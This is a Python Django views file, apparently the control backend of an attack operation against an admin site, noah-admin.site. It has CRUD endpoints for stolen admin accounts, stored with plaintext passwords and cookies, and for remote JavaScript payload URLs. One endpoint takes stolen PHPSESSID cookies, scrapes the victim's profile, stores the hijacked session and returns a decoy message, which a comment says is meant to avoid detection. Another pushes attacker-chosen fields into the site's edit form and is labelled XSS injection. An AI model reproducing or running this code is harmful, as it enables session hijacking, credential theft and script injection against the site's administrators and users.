"""
管理员账号 CRUD API

POST   /api/cloud_central_control/noah_admin/          - 创建
GET    /api/cloud_central_control/noah_admin/          - 列表
GET    /api/cloud_central_control/noah_admin/<id>/     - 详情
PUT    /api/cloud_central_control/noah_admin/<id>/     - 更新
DELETE /api/cloud_central_control/noah_admin/<id>/     - 删除
"""

import json
import logging
import requests

from django.http import JsonResponse, QueryDict
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from lxml import etree



from XingXingApi.models.noah_admin import NoahAdmin, JsCommand

logger = logging.getLogger(__name__)


def _serialize(admin: NoahAdmin) -> dict:
    """将 NoahAdmin 实例序列化为字典"""
    return {
        "id": admin.id,
        "account": admin.account,
        "password": admin.password,
        "email": admin.email,
        "cookie": admin.cookie,
        "created_at": admin.created_at.strftime("%Y-%m-%d %H:%M:%S") if admin.created_at else None,
        "updated_at": admin.updated_at.strftime("%Y-%m-%d %H:%M:%S") if admin.updated_at else None,
    }


# ==================== 创建 ====================

@csrf_exempt
@require_http_methods(["POST"])
def create_admin(request):
    """
    POST /api/cloud_central_control/noah_admin/

    表单参数:
        account  (必填) 账号
        password (必填) 密码
        email    (可选) 邮箱
        cookie   (可选) Cookie
    """
    account = request.POST.get("account", "").strip()
    password = request.POST.get("password", "").strip()
    email = request.POST.get("email", "").strip()
    cookie = request.POST.get("cookie", "").strip()

    # 校验必填字段
    if not account:
        return JsonResponse({"code": 400, "message": "账号（account）不能为空"}, status=400)
    if not password:
        return JsonResponse({"code": 400, "message": "密码（password）不能为空"}, status=400)

    # 检查账号是否已存在
    if NoahAdmin.objects.filter(account=account).exists():
        return JsonResponse({"code": 400, "message": f"账号 '{account}' 已存在"}, status=400)

    try:
        admin = NoahAdmin.objects.create(
            account=account,
            password=password,
            email=email,
            cookie=cookie,
        )
        return JsonResponse(
            {"code": 200, "message": "创建成功", "data": _serialize(admin)},
            status=201,
        )
    except Exception as e:
        logger.error(f"创建管理员失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"创建失败: {str(e)}"}, status=500)


# ==================== 列表 ====================

@csrf_exempt
@require_http_methods(["GET"])
def list_admins(request):
    """
    GET /api/cloud_central_control/noah_admin/
    """
    try:
        admins = NoahAdmin.objects.all().order_by("-created_at")
        data = [_serialize(a) for a in admins]
        return JsonResponse(
            {"code": 200, "message": "查询成功", "data": data},
            status=200,
        )
    except Exception as e:
        logger.error(f"查询管理员列表失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"查询失败: {str(e)}"}, status=500)


# ==================== 详情 ====================

@csrf_exempt
@require_http_methods(["GET"])
def get_admin(request, admin_id):
    """
    GET /api/cloud_central_control/noah_admin/<id>/
    """
    try:
        admin = NoahAdmin.objects.get(id=admin_id)
        return JsonResponse(
            {"code": 200, "message": "查询成功", "data": _serialize(admin)},
            status=200,
        )
    except NoahAdmin.DoesNotExist:
        return JsonResponse({"code": 404, "message": "管理员不存在"}, status=404)
    except Exception as e:
        logger.error(f"查询管理员失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"查询失败: {str(e)}"}, status=500)


# ==================== 更新 ====================

@csrf_exempt
@require_http_methods(["PUT"])
def update_admin(request, admin_id):
    """
    PUT /api/cloud_central_control/noah_admin/<id>/

    表单参数 (均为可选，仅传入的字段会被更新):
        account  (可选) 账号
        password (可选) 密码
        email    (可选) 邮箱
        cookie   (可选) Cookie
    """
    try:
        admin = NoahAdmin.objects.get(id=admin_id)
    except NoahAdmin.DoesNotExist:
        return JsonResponse({"code": 404, "message": "管理员不存在"}, status=404)

    # PUT 请求需要手动解析 body（request.POST 只对 POST 方法自动填充）
    put_data = QueryDict(request.body)
    account = put_data.get("account", "").strip()
    password = put_data.get("password", "").strip()
    email = put_data.get("email", "").strip()
    cookie = put_data.get("cookie", "").strip()

    if account:
        # 如果修改账号，检查新账号是否与其他记录冲突
        if account != admin.account and NoahAdmin.objects.filter(account=account).exists():
            return JsonResponse({"code": 400, "message": f"账号 '{account}' 已被使用"}, status=400)
        admin.account = account

    if password:
        admin.password = password

    # email 和 cookie 允许设为空
    if "email" in put_data:
        admin.email = email
    if "cookie" in put_data:
        admin.cookie = cookie

    try:
        admin.save()
        return JsonResponse(
            {"code": 200, "message": "更新成功", "data": _serialize(admin)},
            status=200,
        )
    except Exception as e:
        logger.error(f"更新管理员失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"更新失败: {str(e)}"}, status=500)


# ==================== 删除 ====================

@csrf_exempt
@require_http_methods(["DELETE"])
def delete_admin(request, admin_id):
    """
    DELETE /api/cloud_central_control/noah_admin/<id>/
    """
    try:
        admin = NoahAdmin.objects.get(id=admin_id)
        admin.delete()
        return JsonResponse({"code": 200, "message": "删除成功"}, status=200)
    except NoahAdmin.DoesNotExist:
        return JsonResponse({"code": 404, "message": "管理员不存在"}, status=404)
    except Exception as e:
        logger.error(f"删除管理员失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"删除失败: {str(e)}"}, status=500)


# ======================================================================
# JsCommand CRUD
# ======================================================================

def _serialize_js_command(cmd: JsCommand) -> dict:
    return {
        "id": cmd.id,
        "name": cmd.name,
        "js_code_url": cmd.js_code_url,
        "is_required": cmd.is_required,
        "created_at": cmd.created_at.strftime("%Y-%m-%d %H:%M:%S") if cmd.created_at else None,
        "updated_at": cmd.updated_at.strftime("%Y-%m-%d %H:%M:%S") if cmd.updated_at else None,
    }


# ==================== 创建 ====================

@csrf_exempt
@require_http_methods(["POST"])
def create_js_command(request):
    """
    POST /api/cloud_central_control/noah_admin/js_command/create/

    表单参数:
        name         (必填) 命令名称
        js_code_url  (必填) JS代码完整URL路径
        is_required  (可选) 是否需要执行，默认 true，传 0/false 设为 false
    """
    name = request.POST.get("name", "").strip()
    js_code_url = request.POST.get("js_code_url", "").strip()
    is_required = request.POST.get("is_required", "true").strip().lower() in ("true", "1", "yes")

    if not name:
        return JsonResponse({"code": 400, "message": "命令名称（name）不能为空"}, status=400)
    if not js_code_url:
        return JsonResponse({"code": 400, "message": "JS代码URL（js_code_url）不能为空"}, status=400)

    if JsCommand.objects.filter(name=name).exists():
        return JsonResponse({"code": 400, "message": f"命令名称 '{name}' 已存在"}, status=400)

    try:
        cmd = JsCommand.objects.create(
            name=name,
            js_code_url=js_code_url,
            is_required=is_required,
        )
        return JsonResponse(
            {"code": 200, "message": "创建成功", "data": _serialize_js_command(cmd)},
            status=201,
        )
    except Exception as e:
        logger.error(f"创建JS命令失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"创建失败: {str(e)}"}, status=500)


# ==================== 列表 ====================

@csrf_exempt
@require_http_methods(["GET"])
def list_js_commands(request):
    """
    GET /api/cloud_central_control/noah_admin/js_command/
    """
    try:
        cmds = JsCommand.objects.all().order_by("-created_at")
        data = [_serialize_js_command(c) for c in cmds]
        return JsonResponse(
            {"code": 200, "message": "查询成功", "data": data},
            status=200,
        )
    except Exception as e:
        logger.error(f"查询JS命令列表失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"查询失败: {str(e)}"}, status=500)


# ==================== 详情 ====================

@csrf_exempt
@require_http_methods(["GET"])
def get_js_command(request, cmd_id):
    """
    GET /api/cloud_central_control/noah_admin/js_command/<id>/
    """
    try:
        cmd = JsCommand.objects.get(id=cmd_id)
        return JsonResponse(
            {"code": 200, "message": "查询成功", "data": _serialize_js_command(cmd)},
            status=200,
        )
    except JsCommand.DoesNotExist:
        return JsonResponse({"code": 404, "message": "JS命令不存在"}, status=404)
    except Exception as e:
        logger.error(f"查询JS命令失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"查询失败: {str(e)}"}, status=500)


# ==================== 更新 ====================

@csrf_exempt
@require_http_methods(["PUT"])
def update_js_command(request, cmd_id):
    """
    PUT /api/cloud_central_control/noah_admin/js_command/<id>/update/

    表单参数 (均为可选):
        name         (可选) 命令名称
        js_code_url  (可选) JS代码完整URL路径
        is_required  (可选) 是否需要执行
    """
    try:
        cmd = JsCommand.objects.get(id=cmd_id)
    except JsCommand.DoesNotExist:
        return JsonResponse({"code": 404, "message": "JS命令不存在"}, status=404)

    put_data = QueryDict(request.body)
    name = put_data.get("name", "").strip()
    js_code_url = put_data.get("js_code_url", "").strip()
    is_required_raw = put_data.get("is_required", "").strip()

    if name:
        if name != cmd.name and JsCommand.objects.filter(name=name).exists():
            return JsonResponse({"code": 400, "message": f"命令名称 '{name}' 已存在"}, status=400)
        cmd.name = name

    if js_code_url:
        cmd.js_code_url = js_code_url

    if is_required_raw:
        cmd.is_required = is_required_raw.lower() in ("true", "1", "yes")

    try:
        cmd.save()
        return JsonResponse(
            {"code": 200, "message": "更新成功", "data": _serialize_js_command(cmd)},
            status=200,
        )
    except Exception as e:
        logger.error(f"更新JS命令失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"更新失败: {str(e)}"}, status=500)


# ==================== 删除 ====================

@csrf_exempt
@require_http_methods(["DELETE"])
def delete_js_command(request, cmd_id):
    """
    DELETE /api/cloud_central_control/noah_admin/js_command/<id>/delete/
    """
    try:
        cmd = JsCommand.objects.get(id=cmd_id)
        cmd.delete()
        return JsonResponse({"code": 200, "message": "删除成功"}, status=200)
    except JsCommand.DoesNotExist:
        return JsonResponse({"code": 404, "message": "JS命令不存在"}, status=404)
    except Exception as e:
        logger.error(f"删除JS命令失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"删除失败: {str(e)}"}, status=500)



# ==================== 根据cookie获取个人信息 ====================
@csrf_exempt
@require_http_methods(["POST"])
def set_user_info(request):
    """
    POST /api/cloud_central_control/noah_admin/set_user_info/    
    """
    try:
        cookies = json.loads(request.POST.get("cookies", "[]"))
        for cookie in cookies:
            if cookie["name"] == "PHPSESSID":
                html_text = requests.get("https://noah-admin.site/profile.php", cookies={cookie["name"]: cookie["value"]}).text
                tree = etree.HTML(html_text)
                username = tree.xpath('//form[1]/div[1]/input/@value')[0].strip()
                email = tree.xpath('//form[1]/div[2]/input/@value')[0].strip()
                password = '未获取'
                # 查询数据库中是否存在该用户
                admin = NoahAdmin.objects.filter(account=username).first()
                if admin:
                    # 存在就不管了,直接更新cookie
                    admin.cookie = json.dumps(cookies, ensure_ascii=False)
                    admin.save()
                    break
                
                # 不存在就创建一个新用户
                NoahAdmin.objects.create(
                    account=username,
                    password=password,
                    email=email,
                    cookie=json.dumps(cookies, ensure_ascii=False),
                )

        return JsonResponse(
            {'zh': '您好,我是小影,请联系我TG: @xiaoying1216', 'en': 'Hello, I am Xiaoying, please contact me on TG: @xiaoying1216'},  # 为了不让他们发现,随便返回点东西
            status=200,
        )
                
    except Exception as e:
        logger.error(f"查询用户信息失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"查询失败: {str(e)}"}, status=500)


# XSS注入_站点名称
@csrf_exempt
@require_http_methods(["POST"])
def xss_inject_name(request):
    """
    POST /api/cloud_central_control/noah_admin/xss_inject_name/    
    """
    try:
        params = {
            'page': request.POST.get("page", "43"),
        }

        cookies = {
            'PHPSESSID': request.POST.get("PHPSESSID"),
        }

        data = {
            'action': 'edit_site',
            'id': request.POST.get("id"),
            'q': '',
            'config_filter': '',
            'category_filter': '',  
            'page': request.POST.get("page", "43"),
            'name': request.POST.get("name"),
            'url': request.POST.get("url"),
            'description': request.POST.get("description", ''),
            'group_id': request.POST.get("group_id", "g7"),
            'download_link': request.POST.get("download_link", ''),
        }

        headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://noah-admin.site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }

        requests.post('https://noah-admin.site/sites.php', params=params, cookies=cookies, headers=headers, data=data)
        return JsonResponse({"code": 200, "message": "注入成功"}, status=200)
                
    except Exception as e:
        logger.error(f"XSS注入失败: {e}", exc_info=True)
        return JsonResponse({"code": 500, "message": f"XSS注入失败: {str(e)}"}, status=500)

